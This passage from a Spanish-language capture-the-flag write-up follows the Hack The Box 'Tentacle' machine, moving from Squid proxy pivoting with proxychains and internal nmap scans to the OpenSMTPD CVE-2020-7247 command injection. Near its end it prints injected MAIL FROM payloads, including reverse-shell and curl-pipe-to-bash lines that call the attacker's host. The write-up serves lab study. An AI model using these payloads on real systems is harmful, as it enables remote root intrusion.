+&lt;p&gt;Please contact the &lt;a href="mailto:j.nakazawa@realcorp.htb?subject=CacheErrorInfo%20-%20ERR_CACHE_ACCESS_DENIED&amp;amp;body=CacheHost%3A%20srv01.realcorp.htb%0D%0AErrPage%3A%20ERR_CACHE_ACCESS_DENIED%0D%0AErr%3A%20%5Bnone%5D%0D%0ATimeStamp%3A%20Tue,%2002%20Mar%202021%2019%3A28%3A22%20GMT%0D%0A%0D%0AClientIP%3A%2010.10.14.135%0D%0A%0D%0AHTTP%20Request%3A%0D%0AGET%20%2F%20HTTP%2F1.1%0AUser-Agent%3A%20curl%2F7.74.0%0D%0AAccept%3A%20*%2F*%0D%0AProxy-Connection%3A%20Keep-Alive%0D%0AHost%3A%20realcorp.htb%0D%0A%0D%0A%0D%0A"&gt;cache administrator&lt;/a&gt; if you have difficulties authenticating yourself.&lt;/p&gt;
+
+&lt;br&gt;
+&lt;/div&gt;
+
+&lt;hr&gt; 
+&lt;div id="footer"&gt;
+&lt;p&gt;Generated Tue, 02 Mar 2021 19:28:22 GMT by srv01.realcorp.htb (squid/4.11)&lt;/p&gt;
+&lt;!-- ERR_CACHE_ACCESS_DENIED --&gt;
+&lt;/div&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+
+<p>Al parecer necesitamos estar autenticados para poder acceder a la cache ):</p>
+
+<p>Jmmm, antes de seguir, intentemos ver esta respuesta en el navegador, por lo tanto vamos a configurar el proxy, en mi caso en <strong>Firefox</strong>:</p>
+
+<ul>
+  <li><a href="https://www.whatismyip.com/what-is-a-proxy/">Use está guía - whatismyip.com/what-is-a-proxy</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310firefox_conf_proxy.png" alt="310firefox_conf_proxy" /></p>
+
+<ul>
+  <li>Le decimos cuál es la IP del proxy y su puerto</li>
+  <li>También le indicamos que dominios no queremos que los procese el proxy, tales como <code>.net</code>, <code>.com</code>, <code>.org</code>, etc…</li>
+</ul>
+
+<p>Pero al intentar resolver hacia el dominio, se queda cargando y no obtenemos nada, intente quitándolo del archivo <code>/etc/hosts</code>, pero igualmente se queda intentando resolver… Asi que nada, nos quedamos con la respuesta de <code>cURL</code>…</p>
+
+<p>Indagando nos encontramos con un exploit para la versión que tenemos de <code>Squid</code> sobre <strong>HTTP Requests Smuggling</strong></p>
+
+<ul>
+  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15811">CVE sobre la vulnerabilidad - CVE-2020-15811</a>.</li>
+  <li><a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/">Lindo post para adentrarse en el <strong>HTTP Request Smuggling</strong></a>.</li>
+</ul>
+
+<p>Pero despues de probar cositas no logramos ver esto reflejado…</p>
+
+<p>Intentando <strong>fuzzing</strong> no vemos nada tampoco.</p>
+
+<p>…</p>
+
+<h2 id="movimiento-lateral">Movimiento lateral <a href="#movimiento-lateral">#</a></h2>
+
+<p>En este punto estuve bastante perdido asi que decidí pedir ayuda. Me indico si había usado <code>proxychains</code>, si no, que le echará un ojo :O</p>
+
+<p>…</p>
+
+<h3 id="proxy-chains">Proxychains <a href="#proxy-chains">⌖</a></h3>
+
+<p>Teniendo en cuenta el funcionamiento de un proxy (que ya vimos con <code>squid</code>). <strong>Proxychains</strong> nos permite forzar cualquier conexión a que sea manipulada entre proxies, lo que significaría pivotear entre muchas IPs para que al final nuestra IP se convierta en otra totalmente diferente, esto viéndolo desde la parte del anonimato, pero hablando para el caso puntual en el que necesitamos interactuar con un servicio que si o si tiene que ser hecho mediante un proxy, acá nos puede ayudar <code>proxychains</code>, además que podemos lanzar comandos (<code>nmap</code> por ejemplo) usando la herramienta como intermediario… Démosle a la práctica…</p>
+
+<ul>
+  <li><a href="https://linuxhint.com/proxychains-tutorial/">Proxychains tutorial</a>.</li>
+  <li><a href="https://medium.com/swlh/proxying-like-a-pro-cccdc177b081">Proxing like a pro using <strong>proxychains</strong></a>.</li>
+</ul>
+
+<blockquote>
+  <p>We need to setup proxychains configuration file. We also need a list of proxy server. Proxychains configuration file located on <code>/etc/proxychains.conf</code> <a href="https://linuxhint.com/proxychains-tutorial/">Proxychains tutorial</a>.</p>
+</blockquote>
+
+<p>Modifiquemos el archivo <code>/etc/proxychains.conf</code> según los recursos anteriores:</p>
+
+<pre><code class="language-bash">...
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+#socks4         127.0.0.1 9050 #Este es la configuracion por default para usar tor. Envia nuestro trafico por el puerto 9050
+#
+# Proxies tentacle box
+http  10.10.10.224   3128 # Proxy squid
+</code></pre>
+
+<p>Entonces ahora que ya tenemos el proxy dentro del archivo de configuración, podemos probar mediante <code>nmap</code> a ver si tenemos acceso a alguna de las IPs que encontramos o al localhost, probemos con la IP <code>10.91.243.31</code>:</p>
+
+<pre><code class="language-bash">❭ proxychains nmap -sT --min-rate=2000 -Pn -v 10.197.243.31 -oG proxyScan-31 2&gt;/dev/null
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-sT</td>
+      <td style="text-align: left">Para que haga un escaneo de puertos y espere respuesta <a href="https://nmap.org/book/scan-methods-connect-scan.html">(SYN/ACK)</a>. Ya que <code>-p-</code> no me estaba dando respuesta (aunque hubiera podido usar <code>-sT -p- --open</code> pero pues no se me ocurrió en ese momento.</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat proxyScan-31 
+# Nmap 7.80 scan initiated Wed Mar  3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oG proxyScan-31 10.197.243.31
+# Ports scanned: TCP(1000) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.197.243.31 ()  Status: Up
+Host: 10.197.243.31 ()  Status: Up
+# Nmap done at Wed Mar  3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 239.78 seconds
+</code></pre>
+
+<p>Pero pues no obtenemos nada :P Si probamos el escaneo sobre el <strong>localhost</strong> obtenemos nuevos puertos (:</p>
+
+<pre><code class="language-bash">❭ cat proxyScan-127 
+# Nmap 7.80 scan initiated Wed Mar  3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyScan-127 127.0.0.1
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.24s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+464/tcp  open  kpasswd5
+749/tcp  open  kerberos-adm
+3128/tcp open  squid-http
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Wed Mar  3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 239.66 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>464</td>
+      <td style="text-align: left"><a href="https://security.stackexchange.com/questions/205492/what-is-this-service#answers">Kpasswd5 (Kerberos Password Change)</a>: Usado para cambiar/configurar passwords en un Controlador de Dominio.</td>
+    </tr>
+    <tr>
+      <td>749</td>
+      <td style="text-align: left"><a href="https://www.speedguide.net/port.php?port=749">kerberos-adm</a>: Administracion de kerberos :P</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Pensando un rato, cai en cuenta en realmente el concepto de <code>proxychains</code> (esta explicación puede ser larga, o no, pero igual la quiero hacer, se la pueden saltar :P)</p>
+
+<p>El concepto de <strong>proxy</strong> ya lo tenemos claro, entonces simplemente nos estamos apoyando de <code>proxychains</code> para ejecutar comandos… Peeero si nos enfocamos en su uso real (encadenar proxys) podemos <strong>por ejemplo</strong> pensar lo siguiente…</p>
+
+<p>Hacemos la petición hacia la el dominio <code>realcorp.htb</code> mediante el proxy <code>10.10.10.224:3128</code>, ya que si la hacemos sin él, no tenemos respuesta… Ahora, con <code>proxychains</code> podemos indicarle más proxys para que vaya haciendo una cadena, entonces si le indicáramos que queremos hacer una petición a la IP <code>10.197.243.31</code> mediante el proxy <code>10.10.10.224:3128</code> pero que a su vez lo encadene con el proxy <code>127.0.0.1:3128</code> (localhost), le estaríamos indicando que “pivotee” entre proxys para saber si la ip <code>10.197.243.31</code> responde a esa cadena de proxies. El pivoting lo muestra <a href="https://medium.com/swlh/proxying-like-a-pro-cccdc177b081">Vickie Li</a> en su <a href="https://medium.com/swlh/proxying-like-a-pro-cccdc177b081">artículo</a>:</p>
+
+<p><img src="https://miro.medium.com/max/640/1*exRPwGYJpGv6eESldShwzQ.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>(<strong>Creo que es una excelente imagen para plasmar lo dicho, gracias <a href="https://medium.com/swlh/proxying-like-a-pro-cccdc177b081">@Vickie Li</a></strong>).</p>
+
+<p>Entonces probemos la teoría, agreguemos al archivo <code>/etc/proxychains.conf</code> el proxy <code>127.0.0.1:3128</code> (que vimos que esta abierto en el anterior escaneo) y empecemos a ejecutar hacia las IPs:</p>
+
+<pre><code class="language-bash">❭ cat /etc/proxychains.conf 
+...
+# Proxies tentacle box
+http  10.10.10.224   3128 # squid proxy
+http  127.0.0.1      3128 # localhost proxy
+</code></pre>
+
+<p>Ejecutamos inicialmente contra la <code>10.197.243.31</code>:</p>
+
+<pre><code class="language-bash">❭ proxychains nmap -sT --min-rate=2000 -Pn -v 10.197.243.31 -oN proxyScan_loc_31 2&gt;/dev/null
+</code></pre>
+
+<p>Nada, no tenemos acceso:</p>
+
+<pre><code class="language-bash">❭ cat proxyScan_loc_31 
+# Nmap 7.80 scan initiated Wed Mar  3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyScan_loc_31 10.197.243.31
+Nmap scan report for 10.197.243.31
+Host is up (0.36s latency).
+All 1000 scanned ports on 10.197.243.31 are closed
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Wed Mar  3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 371.44 seconds
+</code></pre>
+
+<p>Contra la <code>10.197.243.77</code>:</p>
+
+<pre><code class="language-bash">❭ proxychains nmap -sT --min-rate=2000 -Pn -v 10.197.243.77 -oN proxyScan_loc_77 2&gt;/dev/null
+</code></pre>
+
+<pre><code class="language-bash">❭ cat proxyScan_loc_77 
+# Nmap 7.80 scan initiated Wed Mar  3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyScan_loc_77 10.197.243.77
+Nmap scan report for 10.197.243.77
+Host is up (0.36s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+464/tcp  open  kpasswd5
+749/tcp  open  kerberos-adm
+3128/tcp open  squid-http
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Wed Mar  3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 367.15 seconds
+</code></pre>
+
+<p>Perfecto, tenemos acceso ahora a esta IP mediante la cadena de proxies y conseguimos otro proxy para concatenar:</p>
+
+<pre><code class="language-bash">❭ cat /etc/proxychains.conf 
+...
+# Proxies tentacle box
+http  10.10.10.224   3128 # squid proxy
+http  127.0.0.1      3128 # localhost proxy
+http  10.197.243.77  3128 # .77 proxy
+</code></pre>
+
+<p>Ahora solo nos quedaria probar ante la IP <code>10.197.243.31</code> y ver si tenemos acceso:</p>
+
+<pre><code class="language-bash">❭ proxychains nmap -sT --min-rate=2000 -Pn -v 10.197.243.31 -oN proxyScan_loc_77_31 2&gt;/dev/null
+</code></pre>
+
+<p>Y tedriamos:</p>
+
+<pre><code class="language-bash">❭ cat proxyScan_loc_77_31 
+# Nmap 7.80 scan initiated Wed Mar  3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyScan_loc_77_31 10.197.243.31
+Nmap scan report for 10.197.243.31
+Host is up (0.48s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+464/tcp  open  kpasswd5
+749/tcp  open  kerberos-adm
+3128/tcp open  squid-http
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Wed Mar  3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 482.80 seconds
+</code></pre>
+
+<p>Tenemos un servicio <code>HTTP</code> sobre el puerto <code>80</code> :O Inspeccionemoslo:</p>
+
+<pre><code class="language-bash">❭ proxychains nmap -sT -p 80 -sC -sV -Pn -v 10.197.243.31 -oN port80Scan_loc_77_31 2&gt;/dev/null
+</code></pre>
+
+<pre><code class="language-bash">❭ cat port80Scan_loc_77_31 
+# Nmap 7.80 scan initiated Wed Mar  3 25:25:25 2021 as: nmap -sT -p 80 -sC -sV -Pn -v -oN port80Scan_loc_77_31 10.197.243.31
+Nmap scan report for 10.197.243.31
+Host is up (0.47s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.14.1
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.1
+|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Mar  3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 25.20 seconds
+</code></pre>
+
+<p>Bien, intentemos verlo en la web:</p>
+
+<pre><code class="language-bash">❭ proxychains firefox 10.197.243.31
+</code></pre>
+
+<p>Pero no carga, validemos con <code>cURL</code>:</p>
+
+<pre><code class="language-bash">❭ proxychains curl http://10.197.243.31
+</code></pre>
+
+<pre><code class="language-html">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd"&gt;
+                                
+&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"&gt;
+&lt;head&gt;
+&lt;title&gt;Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux&lt;/title&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
+&lt;style type="text/css"&gt;
+...
+...
+</code></pre>
+
+<p>Tenemos respuesta del servidor web… Estando en este punto algo debemos hacer con la web porque si no sería un gran (grandísimo) rabbit hole… Probemos a incluir la IP en nuestro archivo <code>/etc/hosts</code> de nuevo a ver si cambia algo la respuesta.</p>
+
+<ul>
+  <li>Recuerden cuando obtuvimos esta IP, fue en la enumeración del <strong>DNS</strong>: <code>10.197.243.31</code> -&gt; <code>wpad.realcorp.htb</code></li>
+</ul>
+
+<pre><code class="language-bash">❭ cat /etc/hosts
+...
+10.197.243.31 wpad.realcorp.htb
+...
+</code></pre>
+
+<p>Volviendo a intentar… La web tampoco carga, pero <code>cURL</code> nos responde con un <strong>prohibido</strong> (nos deniega el acceso):</p>
+
+<pre><code class="language-bash">❭ proxychains curl wpad.realcorp.htb
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-&lt;&gt;-10.10.10.224:3128-&lt;&gt;-127.0.0.1:3128-&lt;&gt;-10.197.243.77:3128-&lt;&gt;&lt;&gt;-10.197.243.31:80-&lt;&gt;&lt;&gt;-OK
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
+&lt;body bgcolor="white"&gt;
+&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.14.1&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Jmmm, intentemos hacer <strong>fuzzing</strong> a ver si encontramos algo:</p>
+
+<pre><code class="language-bash">❭ proxychains dirsearch.py -u wpad.realcorp.htb 2&gt;/dev/null
+</code></pre>
+
+<pre><code class="language-bash">...
+
+[18:31:40] Starting: 
+[18:32:59] 200 -  342B  - /wpad.dat
+
+Task Completed
+</code></pre>
+
+<p>Opa, tenemos un archivo llamado <code>wpad.dat</code>… Esto me llamo la atención asi que me fui pa la web a indagar un poco sobre el dominio <code>wpad.&lt;etc&gt;.&lt;etc&gt;</code>:</p>
+
+<blockquote>
+  <p><code>WPAD</code> es un protocolo diseñado para hacer una configuracion de proxy facilmente, todo mediante un archivo que es el encargado de hacerlo facil (<code>wpad.dat</code>). Su funcionamiento es simple, cuando alguien se conecta a la red, el dispositivo descargara el archivo y automaticamente configurara todo el proceso para que ese alguien pueda interactuar con la red sin problemas.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://www.redeszone.net/2017/03/15/desactiva-wpad-windows/">¿Qué es el protocolo <strong>WPAD</strong>?</a>.</li>
+</ul>
+
+<p>Perfecto ahora que sabemos que hace ese archivo y porque esta ahí, procedamos a descargarlo a ver que contiene:</p>
+
+<pre><code class="language-bash">❭ proxychains wget http://wpad.realcorp.htb/wpad.dat
+</code></pre>
+
+<pre><code class="language-bash">❭ cat wpad.dat 
+function FindProxyForURL(url, host) {
+if (dnsDomainIs(host, "realcorp.htb"))
+return "DIRECT";
+if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
+return "DIRECT"; 
+if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
+return "DIRECT"; 
+
+return "PROXY proxy.realcorp.htb:3128";
+}
+</code></pre>
+
+<p>Bien, vemos como asigna las direcciones IP:</p>
+
+<ul>
+  <li>Un ID <code>10.197.243.0</code> (que con este rango de IPs ya jugamos).</li>
+  <li>Un nuevo ID <code>10.241.251.0</code> del cual podemos probar a ver que IPs están activas (Entre el rango de <code>.1</code> a <code>.254</code>).</li>
+</ul>
+
+<p>Hagámosle el escaneo para saber que IPs nos reporta como activas:</p>
+
+<pre><code class="language-bash">❭ proxychains nmap -v --min-rate=2000 10.241.251.0/24 -oN allIP 2&gt;/dev/null
+</code></pre>
+
+<p>El reporte es gigante, podemos extraer info esclarecedora asi:</p>
+
+<pre><code class="language-bash">❭ cat allIP | grep "host down"
+Nmap scan report for 10.241.251.4 [host down]
+...
+❭ cat allIP | grep "host down" | wc -l
+26
+</code></pre>
+
+<p>Hay 26 hosts que al parecer están inactivos. Los que no tienen ese estado los filtra como <code>Up</code>:</p>
+
+<pre><code class="language-bash">❭ cat allIP | grep "up" -A 1 -B 1
+Nmap scan report for 10.241.251.6
+Host is up (0.00015s latency).
+All 1000 scanned ports on 10.241.251.6 are filtered
+...
+</code></pre>
+
+<p>Entonces, extraigamos las IPs y guardémoslas en un archivo para hacerle un escaneo de puertos rápido, aprovechemos que en la línea que contiene el <code>filtered</code> aparecen:</p>
+
+<blockquote>
+  <p><code>filtered</code> nos indica que <strong>nmap</strong> no puede saber con certeza esta abierto. <a href="https://nmap.org/man/es/man-port-scanning-basics.html">Tipos de estados - nmap</a>.</p>
+</blockquote>
+
+<pre><code class="language-bash">❭ cat allIP | grep "filtered"
+All 1000 scanned ports on 10.241.251.0 are filtered
+All 1000 scanned ports on 10.241.251.1 are filtered
+All 1000 scanned ports on 10.241.251.2 are filtered
+...
+❭ cat allIP | grep "filtered" | cut -d ' ' -f 6 &gt; IPtoSCAN
+❭ cat IPtoSCAN 
+10.241.251.0
+10.241.251.1
+10.241.251.2
+10.241.251.3
+...
+</code></pre>
+
+<p>Despues de un sondeo y probar cosas, el que mejor se comportó fue este escaneo:</p>
+
+<pre><code class="language-bash">❭ proxychains nmap -sT --top-ports=100 --open --host-timeout 2m --min-rate=2000 -Pn -v -iL IPtoSCAN -oN proxyNEW_ports 2&gt;/dev/null
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>–top-ports</td>
+      <td style="text-align: left">Escanea los X puertos más populares (100 en este caso).</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td>–host-timeout</td>
+      <td style="text-align: left">Si ha pasado X tiempo y el escaneo no ha acabado, cancela la conexión con esa dirección.</td>
+    </tr>
+    <tr>
+      <td>–iL</td>
+      <td style="text-align: left">Toma un archivo donde estén direcciones IP.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Al final en el archivo <code>proxyNEW_ports</code> se guardó muuuuuuuuuuucho, pero todas las IPs fueron descartadas por timeout… Peeero si nos damos cuenta (o filtramos con grep) en el verbose, tenemos un puerto sobre la ip <code>10.241.251.113</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_proxy_nmap_found113.png" alt="310bash_proxy_nmap_found113" /></p>
+
+<pre><code class="language-bash">...
+10.241.251.134 timed out during Connect Scan (7 hosts left)
+Discovered open port 25/tcp on 10.241.251.113
+...
+</code></pre>
+
+<p>Perfectoooooooooooooo, ahora volvamos a validar hacia ese host:</p>
+
+<pre><code class="language-bash">❭ proxychains nmap -sT --min-rate=2000 -Pn -v 10.241.251.113 -oN proxyNEW-113 2&gt;/dev/null
+</code></pre>
+
+<pre><code class="language-bash">❭ cat proxyNEW-113 
+# Nmap 7.80 scan initiated Thu Mar  4 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyNEW-113 10.241.251.113
+Nmap scan report for 10.241.251.113
+Host is up (0.50s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+25/tcp open  smtp
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Thu Mar  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 489.74 seconds
+</code></pre>
+
+<p>Bien, hagámosle el escaneo de scripts y versiones para ver quien esta manteniendo ese puerto <code>SMTP</code>:</p>
+
+<pre><code class="language-bash">❭ proxychains nmap -p 25 -sC -sV -Pn -v 10.241.251.113 -oN proxyNEW-113_port25 2&gt;/dev/null
+</code></pre>
+
+<pre><code class="language-bash">❭ cat proxyNEW-113_port25 
+# Nmap 7.80 scan initiated Thu Mar  4 25:25:25 2021 as: nmap -p 25 -sC -sV -Pn -v -oN proxyNEW-113_port25 10.241.251.113
+Nmap scan report for 10.241.251.113
+Host is up (0.47s latency).
+
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp    OpenSMTPD
+| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
+|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 
+Service Info: Host: smtp.realcorp.htb
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Mar  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 12.14 seconds
+</code></pre>
+
+<p>Vale entonces tenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">25</td>
+      <td style="text-align: left"><a href="https://blog.mailrelay.com/es/2017/04/25/que-es-el-smtp">SMTP</a></td>
+      <td style="text-align: left">OpenSMTPD 2.0.0</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Domain: <code>smtp.realcorp.htb</code>.</li>
+</ul>
+
+<blockquote>
+  <p>OpenSMTPD is the mail transfer agent (e-mail server) of the OpenBSD operating system and is also available as a ‘portable’ version for other UNIX systems, such as GNU/Linux. <a href="https://www.rangeforce.com/blog/cyber-security-training-module-cve-2020-7247-priviledged-remote-code-execution-os-command-injection">RangeForce.com - CVE-2020-7247</a>.</p>
+</blockquote>
+
+<p>Investigando en internet sobre esa versión, encontramos una vulnerabilidad llamativa que nos permite ejecutar comandos en el servidor que contenga el servicio <code>SMTP</code> como <strong>root</strong>:</p>
+
+<ul>
+  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247">CVE-2020-7247 - cve.mitre.org</a>.</li>
+</ul>
+
+<blockquote>
+  <p>The vulnerability is caused by improper validation of the e-mail sender address. 
+The sender address is included in the command line when the mailbox delivery program is called; if the sender address includes shell meta-characters these will be interpreted by the shell, allowing the execution of commands on the server. <a href="https://www.rangeforce.com/blog/cyber-security-training-module-cve-2020-7247-priviledged-remote-code-execution-os-command-injection">RangeForce.com - CVE-2020-7247</a>.</p>
+</blockquote>
+
+<p>Nice, suena lindo lindo.</p>
+
+<p>Pero antes de probar, recordemos que al inicio encontramos un correo del administrador del sistema: <code>j.nakazawa@realcorp.htb</code>. Recordé una forma que <a href="https://www.youtube.com/c/ippsec/videos">ippsec</a> enseño para comprobar si un usuario es válido en el servicio <code>SMTP</code>, asi que hagámosla para asegurarnos que ese correo exista:</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=ob9SgtFm6_g&amp;t=1150s">Validando usuarios manualmente en el servidor <strong>SMTP</strong> - ippsec video</a></li>
+</ul>
+
+<p>Hacemos una trama normal, solo que en el receptor ponemos el usuario que creemos válido y otro que probablemente no, la respuesta es la clave:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310proxy_validate_nakazawaUSERsmtp.png" alt="310proxy_validate_nakazawaUSERsmtp" /></p>
+
+<p>Perfecto, entonces sabemos que es una dirección de correo válida, ahora si exploremos la explotación…</p>
+
+<ul>
+  <li><a href="https://www.rangeforce.com/blog/cyber-security-training-module-cve-2020-7247-priviledged-remote-code-execution-os-command-injection">CVE-2020-7247 Privileged Remote Code Execution / Command Injection</a>.</li>
+  <li><a href="https://packetstormsecurity.com/files/156137/OpenBSD-OpenSMTPD-Privilege-Escalation-Code-Execution.html">OpenSMTPD Privilege Escalation Code Execution</a>.</li>
+  <li><a href="https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/">OpenSMTPD Remote Vulnerability</a>.</li>
+  <li><a href="https://github.com/superzerosec/cve-2020-7247">Exploit - github.com/superzerosec/CVE-2020-7247</a>.</li>
+</ul>
+
+<p><strong>(El exploit de <code>github.com/superzerosec</code> es funcional, pero en mis primeros intentos no logre que funcionara (por una tontada que veremos adelante y que se me olvido probar) asi que lo deje a un lado y empece a buscar otras formas)</strong>.</p>
+
+<p>En el primer recurso nos muestra una forma sencilla de explotar la vulnerabilidad, en el que le agregaríamos al remitente el código que queramos ejecutar:</p>
+
+<blockquote>
+  <p>Ejemplo del articulo:</p>
+  <blockquote>
+    <p>MAIL FROM:&lt;; killall puppies ; echo &gt;</p>
+  </blockquote>
+</blockquote>
+
+<blockquote>
+  <p>Nuestro ejemplo:</p>
+  <blockquote>
+    <p>MAIL FROM:&lt;;ping -c 1 10.10.14.138;sh&gt;</p>
+  </blockquote>
+</blockquote>
+
+<p>Lo que quiero lograr es ver si la máquina nos hace una petición <code>ICMP</code>, asi que pongámonos en escucha por la interfaz donde esta nuestra IP (en este caso la de HTB, <code>tun0</code>) y filtremos por las capturas <strong>ICMP</strong>:</p>
+
+<pre><code class="language-bash">❭ tshark -i tun0 -Y "icmp" 2&gt;/dev/null
+</code></pre>
+
+<p>Y ejecutamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_proxy_telnet_poc_withping.png" alt="310bash_proxy_telnet_poc_withping" /></p>
+
+<p>Perfecto, tenemos ejecución remota de comandos, intentemos ejecutarnos una Reverse Shell (JA)…</p>
+
+<p>Intentando cositas como:</p>
+
+<blockquote>
+  <p>MAIL FROM:&lt;;ping -c 1 10.10.14.138;id | nc 10.10.14.138 4433;&gt;</p>
+  <blockquote>
+    <p>Obtenemos la peticion <code>ICMP</code> pero nada en nuestro listener <code>nc</code>.
+MAIL FROM:&lt;;ping -c 1 10.10.14.138;bash -i &gt;&amp; /dev/tcp/10.10.14.138/4433 0&gt;&amp;1;&gt;
+Nos da un error de que no es valido el caracter <code>&amp;</code>.
+MAIL FROM:&lt;;ping -c 1 10.10.14.138;curl http://10.10.14.138/revsh.sh | bash;&gt;
+No obtenemos ninguna peticion en nuestro servidor.</p>
+  </blockquote>
+</blockquote>
+
+<p>Y bueno otras pruebas, nada… Despues de varios intentos fallidos, volvi a la web y encontre uno de los recursos que referencie antes, en el que nos indican el por que no estamos obteniendo la Shell:</p>
+
+<ul>
+  <li><a href="https://packetstormsecurity.com/files/156137/OpenBSD-OpenSMTPD-Privilege-Escalation-Code-Execution.html">OpenSMTPD Privilege Escalation Code Execution</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310page_CVE_we_cant_use_special_chars.png" alt="310page_CVE_we_cant_use_special_chars" /></p>
+
+<p>Y más abajo nos indica:</p>
+
+<blockquote>
+  <p>“we cannot use the <code>|</code> and <code>&gt;</code> characters”</p>
+</blockquote>
+
+<p>Ya que transforma esos caracteres en <code>:</code>…</p>
+
+<p>Peeeeeeeeeeero, en el mismo artículo, nos da un PoC de como se haría para aún asi bypassear esto, emulémoslo pero para conseguir una Shell:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310page_CVE_we_can_bypass_invalid_chars.png" alt="310page_CVE_we_can_bypass_invalid_chars" /></p>
+
+<p>Nos ponemos en escucha:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4433
+listening on [any] 4433 ...
+</code></pre>
+
+<p>Y ejecutamos:</p>
+
